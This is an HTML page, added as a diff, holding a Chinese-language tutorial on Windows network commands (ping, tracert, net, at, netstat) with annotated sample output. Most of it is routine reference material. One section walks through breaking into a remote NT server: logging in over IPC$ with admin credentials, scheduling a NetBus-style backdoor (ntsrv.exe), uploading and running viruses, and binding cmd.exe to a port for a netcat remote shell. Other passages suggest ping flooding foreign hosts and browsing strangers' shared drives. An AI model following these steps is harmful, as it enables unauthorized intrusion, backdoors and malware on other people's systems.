@@ -1,0 +1,700 @@
+<html>
+
+<head>
+<title>文章典藏</title>
+
+<link rel=stylesheet type="text/css" href="../../background.css">
+</head>
+
+<body background="../bg.jpg">
+
+<center>
+<b align=center><a href="computer.html">回上一頁</a></b>
+<hr size=3 color=green>
+
+
+	<table border=1 cellspacing=5 cellpadding=10 >
+	
+	<tr align=center><td width=500><font size=3 color=blue>基礎網路命令</font></td></tr>
+	<tr><td><font size=3 color=brown>
+1. ping：這是TCP／IP協議中最有用的命令之一 
+<br />
+它給另一個系統發送一系列的數據包，該系統本身又發回一個響應，這條實用程序對查找遠程主機很有用，它返回的結果表示是否能到達主機，宿主機發送一個返回數據包需要多長時間。 
+<br />
+Usage： ping 〔-t〕 〔-a〕 〔-n count〕 〔-l size〕 〔-f〕 〔-i TTL〕 〔-v TOS〕 
+<br />
+〔-r count〕 〔-s count〕 〔〔-j host-list〕 〔-k host-list〕〕 
+<br />
+〔-w timeout〕 destination-list 
+<br />
+
+<br />
+Options： 
+<br />
+-t Ping the specifed host until interrupted.（除非人為中止，否則一直ping下去） 
+<br />
+-a Resolve addresses to hostnames.（把IP轉為主機名） 
+<br />
+-n count Number of echo requests to send.（響應請求的數量） 
+<br />
+-l size Send buffer size.（封包的大小） 
+<br />
+-f Set Don't Fragment flag in packet.（信息包中無碎片） 
+<br />
+-i TTL Time To Live.（時間） 
+<br />
+-v TOS Type Of Service.（服務類型） 
+<br />
+-r count Record route for count hops. 
+<br />
+-s count Timestamp for count hops. 
+<br />
+-j host-list Loose source route along host-list. 
+<br />
+-k host-list Strict source route along host-list.（較嚴格的……唉，怎麼譯好……算了，放著吧） 
+<br />
+-w timeout Timeout in milliseconds to wait for each reply.（timeout的時間） 
+<br />
+比如大家可能都知道的一個命令 # ping -f -s 65000 ***.***.***.***或者前階段大家所謂ping死霉國佬時所用的命令（當然這樣只會造成我方自己的網絡阻塞）。 
+<br />
+其實這個命令主要是用來看對方應答的速度，如果怎麼ping 得到的結果都是request time out。那恐怕你根本就不用你去找這台主機了，它不在你的射程之內。 
+<br />
+2. winipcfg： 
+<br />
+這是用來看自己IP位址的小工具，win98自帶，NT裡則網絡監視器裡就能看到IP了，還有個小實用程序叫……好像是叫IPCONFIG吧，沒怎麼用，都快忘了……這種東東網上其實相當之多，但既然「自帶」，又何須外求，何況網上下載的黑客的東東裡有沒有特洛伊猶未可知，再說了，如果你不是在自己的「愛姬」上運行，豈不是就沒法幹活？——哈，不好意思，跑題了，但——接著跑兩句：可以把一些常用的、經典的工具上傳到網上，當作一個備份，什麼時候在網吧、某家公司要幹活的話，直接下載就是一個完整無缺的工具包了。 
+<br />
+這個東東相當簡單，直接在DOS下鍵入命令就是了，沒有什麼參數。 
+<br />
+3. tracert：是驗證通往遠程主機路徑的實用程序 
+<br />
+用法： tracert 〔-d〕 〔-h maximum_hops〕 〔-j host-list〕 〔-w timeout〕 target_name 
+<br />
+
+<br />
+參數： 
+<br />
+-d Do not resolve addresses to hostnames.（不將IP轉為主機名） 
+<br />
+-h maximum_hops Maximum number of hops to search for target.（最大跟蹤數量） 
+<br />
+-j host-list Loose source route along host-list. 
+<br />
+-w timeout Wait timeout milliseconds for each reply.（time out 的時間） 
+<br />
+
+<br />
+最簡單的用法就是 tracert hostname 其中hostname是計算機名或你想跟蹤其路徑的計算機的IP地址。TRACERT將返回數據包藉以到達最終目的地的各種IP地址，你知道該怎麼利用它嗎？ 
+<br />
+
+<br />
+
+<br />
+我略為解釋一下吧：跟蹤通往210.142.192.130的路由，最大30： 
+<br />
+第一行：*&^%&* 我就是從這裡出去的（呵，真不想說^&^） 
+<br />
+第四行：是不是快要出國了呢？ 
+<br />
+第九行：呀！這是日本鬼子的地盤…… 
+<br />
+
+<br />
+4. net：這可是個非常棒的東西，如果不會用的話，趕緊睜大眼睛噢 
+<br />
+
+<br />
+
+<br />
+這個命令的語法是： 可用的命令包括： 
+<br />
+NET ACCOUNTS NET HELP NET SHARE 
+<br />
+NET COMPUTER NET HELPMSG NET START 
+<br />
+NET CONFIG NET LOCALGROUP NET STATISTICS 
+<br />
+NET CONFIG SERVER NET NAME NET STOP 
+<br />
+NET CONFIG WORKSTATION NET PAUSE NET TIME 
+<br />
+NET CONTINUE NET PRINT NET USE 
+<br />
+NET FILE NET SEND NET USER 
+<br />
+NET GROUP NET SESSION NET VIEW 
+<br />
+
+<br />
+NET HELP SERVICES 列出用戶可以啟動的網絡服務。 
+<br />
+NET HELP SYNTAX 解釋如何閱讀 NET HELP 語法行。 
+<br />
+NET HELP command MORE 用於逐屏顯示幫助。 
+<br />
+
+<br />
+我可就不逐樣解釋了——這樣會把我的手指累壞，就說說常用的兩個命令吧 
+<br />
+
+<br />
+a.net view 
+<br />
+
+<br />
+這個命令的語法是：NET VIEW 〔computername ／DOMAIN〔：domainname〕〕 
+<br />
+NET VIEW ／NETWORK：NW 〔computername〕 
+<br />
+
+<br />
+NET VIEW 用於顯示一個計算機上共享資源的列表。當不帶選項使用本命令時， 
+<br />
+它就會顯示當前域或網絡上的計算機上的列表。 
+<br />
+
+<br />
+computername 指用戶希望瀏覽其共享資源的計算機。 
+<br />
+／DOMAIN：domainname 指定用戶希望瀏覽有效的計算機所在的域。如果省略了域名， 
+<br />
+就會顯示局域網絡上的所有域。 
+<br />
+／NETWORK：NW 顯示 NetWare 網絡上所有可用的服務器。如果指定了一個計算 
+<br />
+機名，就會顯示NetWare 網絡中那個計算機上的可用資源。 
+<br />
+
+<br />
+至於舉例嘛，比如你知道一個遠程計算機***.***.**.***上有開資源共享，那麼運行 
+<br />
+net view ***.***.**.*** 就可以了 
+<br />
+
+<br />
+
+<br />
+b.net use 
+<br />
+
+<br />
+這個命令的語法是：NET USE 〔devicename *〕 〔computernamesharename〔volume〕 〔password *〕〕 
+<br />
+〔／USER：〔domainname〕username〕 
+<br />
+〔〔／DELETE〕 〔／PERSISTENT：｛YES NO｝〕〕 
+<br />
+
+<br />
+NET USE 〔devicename *〕 〔password *〕〕 〔／HOME〕 
+<br />
+
+<br />
+NET USE 〔／PERSISTENT：｛YES NO｝〕 
+<br />
+
+<br />
+
+<br />
+NET USE 用於將計算機與共享的資源相連接，或者切斷計算機與共享資源的 
+<br />
+連接。當不帶選項使用本命令時，它會列出計算機的連接。 
+<br />
+
+<br />
+devicename 指定一個名字以便與資源相連接，或者指定要切斷的設備。有兩種類型 
+<br />
+的設備名：磁盤驅動器 （D： 至 Z：） 和打印機 （LPT1： 至 LPT3：）。輸入 
+<br />
+一個星號來代替一個指定的設備名可以分配下一個可用設備名。 
+<br />
+
+<br />
+computername 指控制共享資源的計算機的名字。如果計算機名中包含有空字符， 
+<br />
+就要將雙反斜線 （） 和計算機名一起用引號 （" "）括起來。計算機名 
+<br />
+可以有1 到15 個 字符。 
+<br />
+
+<br />
+sharename 指共享資源的網絡名字。 
+<br />
+volume 指定一個服務器上的 NetWare 卷。用戶必須安裝 Netware 的客戶服務 
+<br />
+（Windows NT 工作站） 或者 Netware 的網關服務 （Windows NT 服務 
+<br />
+器） 並使之與NetWare 服務器相連。 
+<br />
+password 指訪問共享資源所需要的密碼。 
+<br />
+
+<br />
+
+<br />
+* 進行密碼提示。當在密碼提示符下輸入密碼時，密碼是不會顯示的。 
+<br />
+／USER 指定連接時的一個不同的用戶名。 
+<br />
+domainname 指定另外一個域。如果缺省域，就會使用當前登錄的域。 
+<br />
+username 指定登錄的用戶名。 
+<br />
+／HOME 將用戶與他們的宿主目錄相連。 
+<br />
+／DELETE 取消一個網絡連接，並且從永久連接列表中刪除該連接。 
+<br />
+／PERSISTENT 控制對永久網絡連接的使用。其缺省值是最近使用的設置。 
+<br />
+YES 在連接產生時保存它們，並在下次登錄時恢復它們。 
+<br />
+NO 不保存正在產生的連接或後續的連接；現有的連接將在下次登錄時被 
+<br />
+恢復。可以使用 ／DELETE 選項開關來刪除永久連接。 
+<br />
+
+<br />
+
+<br />
+PS：前兩天在綠色兵團的貼子裡見到一位仁兄的話，與這個命令有異曲共工之妙，也說明一個大概： 
+<br />
+在瀏覽器中輸入 file：／／／***.***.**.***c￥ 
+<br />
+
+<br />
+
+<br />
+則網上共享的C盤內容就會顯示出來了，就彷彿用瀏覽器上FTP站點看到的一樣。各位不妨試試，還可試試舉一反三…… 
+<br />
+
+<br />
+
+<br />
+5.at： 排定在特定的日期和時間運行某些命令和程序。 
+<br />
+
+<br />
+
+<br />
+運行 AT 命令之前必須先啟動 Schedule 服務。瞧，現炒就得現賣，剛學了net命令，但這個start命令我可沒詳述，自已看看幫助文件，摸索一下各種命令的用法吧。 
+<br />
+
+<br />
+C：》net start schedule 
+<br />
+Schedule 正在啟動服務..... 
+<br />
+Schedulw 服務啟動成功。 
+<br />
+
+<br />
+AT 〔computername〕 〔 〔id〕 〔／DELETE〕 ／DELETE 〔／YES〕〕 
+<br />
+AT 〔computername〕 time 〔／INTERACTIVE〕 
+<br />
+〔 ／EVERY：date〔，...〕 ／NEXT：date〔，...〕〕 "command" 
+<br />
+
+<br />
+computername 指定遠程計算機。 如果省略這個參數 
+<br />
+命令會被排定在本機上運行。 
+<br />
+id 指定給排定進度命令的識別號。 
+<br />
+
+<br />
+／delete 刪除某個已排定進度的命令。如果省略標識，計算機上所有已排定進度的 
+<br />
+命令都會被刪除。 
+<br />
+／yes 用於刪除所有作業，且不想在運行刪除時顯示確認 
+<br />
+信息 。 
+<br />
+time 指定命令運行的時間。 
+<br />
+／interactive 允許作業在運行時，與用戶通過桌面交互。 
+<br />
+
+<br />
+／every：date〔，...〕 指定在每週或每月的某日 （或某幾日） 運行命令。 
+<br />
+如果省略日期，則默認為在每月的本日運行。 
+<br />
+
+<br />
+／next：date〔，...〕 指定在下一個指定日期 （如，下週三），運行命令。 
+<br />
+如果省略日期，則默認為在每月的本日運行。 
+<br />
+
+<br />
+"command" 準備運行的 Windows NT 命令或批處理文件。 
+<br />
+
+<br />
+知道了如何使用AT，再來看看如何在遠程NT上運行ntsrv.exe： 
+<br />
+1 利用管理員登陸到目的服務器，方法為： net use x.x.x.xipc￥ "adminpwd" ／user："adminuser"（這裡具體方法可參見KILLUSA的文章《HOW TO GET IN NT》） 
+<br />
+2 利用ntsrv.exe啟動遠程： netsvc x.x.x.x schedule ／start 
+<br />
+3 利用AT.EXE在遠程服務器設置程序定時運行，當然最快運行最理想，所以，你可以用letmein.exe得到服務器的時間，然後： 
+<br />
+at x.x.x.x 00：00 ntsrv.exe ／port：64321 
+<br />
+其中00：00要改為用letmein.exe得回來的具體時間+一點容量，等一會後，再在本地啟動netbus.exe，鍵入目的服務器得ip地址或hostname，連接！比如第一種方法，你想要在目的服務器運行諸如病毒之類的東東，可以利用netbus得上傳功能，將各種「大補丸」上傳至目的服務器，再用netbus的"Start program"，鍵入完整路徑，就ok了！第二種方法是利用netbus的「App redirect」功能，啟動遠程telnet服務，如下：在netbus中擊「App redirect」，鍵入"C：》winntsystem32cmd.exe"，Port為：4321，服務就啟動了，然後在本地運行：nc x.x.x.x 4321，出現dos啟動的畫面就表示連接成功： 
+<br />
+Microsoft（R） Windows NT（TM） 
+<br />
+（C） Copyright 1985-1996 Microsoft Corp. 
+<br />
+C：》 
+<br />
+註：這裡有一小段是抄KILLUSA的文章——別找我要稿費啊^&^ 
+<br />
+
+<br />
+6.netstat 這是一個觀察網絡連接狀態的實用工具。 
+<br />
+
+<br />
+它能檢驗IP的當前連接狀態，在斷定你的基本級通信正在進行後，就要驗證系統上的服務。這個服務包括檢查正在收聽輸入的通信量和／或驗證你正在創建一個與遠程站點的會話，它可以很輕鬆地做到這一點。網上也可以看到很多如X-netstat之類的工具，是WIN界面的，更加直觀而已，並沒有多什麼功能，這個命令的具體用法如下： 
+<br />
+
+<br />
+Displays protocol statistics and current TCP／IP network connections.（顯示協議與當前網絡連接） 
+<br />
+
+<br />
+NETSTAT 〔-a〕 〔-e〕 〔-n〕 〔-s〕 〔-p proto〕 〔-r〕 〔interval〕 
+<br />
+
+<br />
+-a Displays all connections and listening ports.（顯示所有連接和監聽端口） 
+<br />
+-e Displays Ethernet statistics. This may be combined with the -s 
+<br />
+option.（顯示以太連接，可以與-s連用） 
+<br />
+-n Displays addresses and port numbers in numeri 
+<br />
+
+<br />
+
+<br />
+Ⅰ Ping 
+<br />
+C:\> Ping 61.136.253.204 [向61.136.253.204發送數據包] 
+<br />
+Pinging 61.136.253.204 With 32 bytes of data: [正在發送 32 字節的包到 ：61.136.253.204] 
+<br />
+
+<br />
+Request timed out. [丟包 原因：超時] 
+<br />
+Reply from 61.136.253.204: bytes=32 time=62ms TTL=120 [正確抵達|大小32字節|消耗時間 62ms ] 
+<br />
+Reply from 61.136.253.204: bytes=32 time=69ms TTL=120 
+<br />
+Reply from 61.136.253.204: bytes=32 time=59ms TTL=120 
+<br />
+
+<br />
+Ping statistics for 61.136.253.204 [資料統計] 
+<br />
+Packets: Sent = 4, Received = 3, Lost = 1 <25% loss>, [發送了4個數據包，收到了3個，丟失1個占25% ] 
+<br />
+Approximate round trip times in milli-seconds: 
+<br />
+Minimum = 59ms, Maximum = 69ms, Average = 63ms [最快抵達 59ms 最慢 69 ms 平均時間 63ms] 
+<br />
+
+<br />
+現在我們來加入命令參數： 
+<br />
+C:\> Ping -a 61.136.253.204 -l 1 -t [-a 代表同時獲取主機名 -l 1 指定 包大小為 1bytes -t 直到用戶手動終止] 
+<br />
+Pinging XINGXING [61.136.253.204] With 1 bytes of data: 
+<br />
+
+<br />
+Reply from 61.136.253.204: bytes=1 time=49ms TTL=120 [因為只發送1字節的包，所以時間縮短了] 
+<br />
+Reply from 61.136.253.204: bytes=1 time=59ms TTL=120 
+<br />
+Reply from 61.136.253.204: bytes=1 time=54ms TTL=120 
+<br />
+Reply from 61.136.253.204: bytes=1 time=55ms TTL=120 
+<br />
+Reply from 61.136.253.204: bytes=1 time=50ms TTL=120 
+<br />
+Reply from 61.136.253.204: bytes=1 time=49ms TTL=120 
+<br />
+Reply from 61.136.253.204: bytes=1 time=49ms TTL=120 
+<br />
+
+<br />
+Ping statistics for 61.136.253.204 
+<br />
+Packets: Sent = 7, Received = 7, Lost = 0 <0% loss>, [發送了7個數據包，收到了7個，丟失0個占0% ] 
+<br />
+Approximate round trip times in milli-seconds: 
+<br />
+Minimum = 49ms, Maximum = 59ms, Average = 52ms [最快抵達 59ms 最慢 69 ms 平均時間 63ms] 
+<br />
+Control-C [按 Ctrl + C 強行終止] 
+<br />
+^C 
+<br />
+C:\> 
+<br />
+
+<br />
+
+<br />
+—————————————————————————————————————————— 
+<br />
+—————————————————————————————————————————— 
+<br />
+—————————————————————————————————————————— 
+<br />
+
+<br />
+
+<br />
+Ⅱ Netstat [這是一個觀察網絡連接狀態的實用工具] 
+<br />
+C:\> Netstat -a [顯示協議與當前網絡連接] 
+<br />
+
+<br />
+Active Connections [活動的連接] 
+<br />
+
+<br />
+[端口類型] [本地的] [外部連接] [狀態] 
+<br />
+Proto Local Address Foreign Address State 
+<br />
+TCP freefwq:telnet freefwq:0 LISTENING [端口類型 TCP 端口 Telnet 監聽狀態] 
+<br />
+TCP freefwq:epmap freefwq:0 LISTENING 
+<br />
+TCP freefwq:microsoft-ds freefwq:0 LISTENING 
+<br />
+TCP freefwq:1026 freefwq:0 LISTENING [端口類型 TCP 端口 1027 **** ] 
+<br />
+TCP freefwq:1027 freefwq:0 LISTENING 
+<br />
+TCP freefwq:5277 freefwq:0 LISTENING 
+<br />
+UDP freefwq:microsoft-ds *:* 
+<br />
+UDP freefwq:3001 *:* 
+<br />
+UDP freefwq:3005 *:* [端口類型 UDP 端口 3005] 
+<br />
+UDP freefwq:4000 *:* 
+<br />
+UDP freefwq:5419 *:* 
+<br />
+. 
+<br />
+. 
+<br />
+. 
+<br />
+C:\> Netstat -n -a [擴展命令參數] 
+<br />
+
+<br />
+Active Connections [活動的連接] 
+<br />
+
+<br />
+TCP 192.168.0.1:139 0.0.0.0:0 LISTENING 
+<br />
+TCP 192.168.0.1:3002 0.0.0.0:0 LISTENING 
+<br />
+TCP 192.168.0.1:3003 0.0.0.0:0 LISTENING 
+<br />
+TCP 192.168.0.1:3004 0.0.0.0:0 LISTENING 
+<br />
+TCP 211.91.155.117:139 0.0.0.0:0 LISTENING 
+<br />
+TCP 211.91.155.117:8384 61.186.175.113:2887 ESTABLISHED [現在就可以很清楚的看見IP地址和端口名了] 
+<br />
+UDP 0.0.0.0:135 *:* 
+<br />
+UDP 0.0.0.0:445 *:* 
+<br />
+UDP 0.0.0.0:3001 *:* 
+<br />
+UDP 0.0.0.0:3005 *:* 
+<br />
+UDP 0.0.0.0:4000 *:* 
+<br />
+. 
+<br />
+. 
+<br />
+. 
+<br />
+C:\> Netstat -e -a [擴展命令參數] 
+<br />
+
+<br />
+Interface Statistics [通信數據統計] 
+<br />
+
+<br />
+Received [收到的] Sent [發送的] 
+<br />
+
+<br />
+Bytes [字節] 91930821 97757485 
+<br />
+Unicast packets [Unicast型] 413966 415520 
+<br />
+Non-unicast packets 4004 1095 
+<br />
+Discards 0 0 
+<br />
+Errors [錯誤的] 0 0 
+<br />
+Unknown protocols [未知協議] 1564 
+<br />
+
+<br />
+
+<br />
+——————————————————————————————————————————— 
+<br />
+——————————————————————————————————————————— 
+<br />
+——————————————————————————————————————————— 
+<br />
+
+<br />
+Ⅲ AT [排定在特定的日期和時間運行某些命令和程序] 
+<br />
+
+<br />
+C:\> AT 
+<br />
+列表是空的。 [因為我們現在沒有給任何指定] 
+<br />
+
+<br />
+C:\> AT 22:30 Start C:\如果這都不算愛.mp3 
+<br />
+新加了一項作業，其作業 ID = 1 [現在我們新建立了一個任務 在22:30分 系統將自動播放歌曲] 
+<br />
+
+<br />
+C:\> AT 
+<br />
+狀態 ID 日期 時間 命令行 [我們輸入 AT 就可以看見先前的任務已經指定了] 
+<br />
+------------------------------------------------- 
+<br />
+1 今天 下午 22:00 Start C:\如果這都不算愛.mp3 
+<br />
+
+<br />
+C:\> AT 1 /Delete [刪除1號任務] 
+<br />
+
+<br />
+
+<br />
+——————————————————————————————————————————— 
+<br />
+—— 打字打的頭昏眼花了，算了 NET 命令就簡單介紹幾個好了 ——— 
+<br />
+——————————————————————————————————————————— 
+<br />
+Ⅳ Net 
+<br />
+
+<br />
+1. Net user [查看用戶列表，或者添加用戶] 
+<br />
+
+<br />
+C:\> Net user 
+<br />
+[下面將會顯示本機上的用戶] 
+<br />
+
+<br />
+C:\> Net user FengXiaoTian /add 
+<br />
+[將在系統中添加一個新用戶 名字叫 FengXiaoTian 
+<br />
+
+<br />
+C:\> Net user administrator 
+<br />
+[查看管理員的登陸情況 很有用的哦！萬一管理員現在在線 。。。。] 
+<br />
+
+<br />
+C:\> Net user FengXiaoTian /delete 
+<br />
+[刪除用戶] 
+<br />
+
+<br />
+2. Net View [用於顯示一個計算機上共享資源的列表。當不帶選項使用本命令時，它就會顯示當前域或網絡上的計算機上的列表。] 
+<br />
+
+<br />
+C:\> Net View [顯示網絡計算機列表] 
+<br />
+
+<br />
+服務器名稱 註釋 
+<br />
+
+<br />
+----------------------------- 
+<br />
+\\FOX 
+<br />
+\\GAOWEI 
+<br />
+\\LHL 
+<br />
+\\WANGWEI 
+<br />
+\\ZWJ 
+<br />
+
+<br />
+C:\> Net View \\FOX [顯示FOX雞的共享內容] 
+<br />
+
+<br />
+共享名 類型 使用為 註釋 
+<br />
+
+<br />
+------------------------------- 
+<br />
+G Disk 
+<br />
+Music Disk 
+<br />
+SharedDocs Disk 
+<br />
+命令成功完成。
+	
+	</font></td></tr>
+
+	</table>
+
+</center>
+</body>
+</html>
